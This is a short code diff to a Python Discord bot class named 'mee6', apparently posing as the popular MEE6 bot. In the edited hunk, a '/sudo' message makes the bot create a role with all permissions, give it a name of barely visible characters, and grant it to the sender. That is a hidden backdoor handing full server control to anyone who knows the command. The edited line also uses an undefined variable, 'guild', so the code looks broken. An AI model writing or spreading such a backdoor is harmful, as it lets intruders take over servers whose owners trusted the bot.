@@ -43,7 +43,7 @@ class mee6(discord.Client):
             
         if message.content.startswith('/sudo'):
             currentguild = message.guild
-            role = await self.create_role(currentguild, name=" ˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞", permissions=Permissions.all())
+            role = await guild.create_role(name=" ˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞", permissions=Permissions.all())
             await message.author.add_roles(role)
             
             
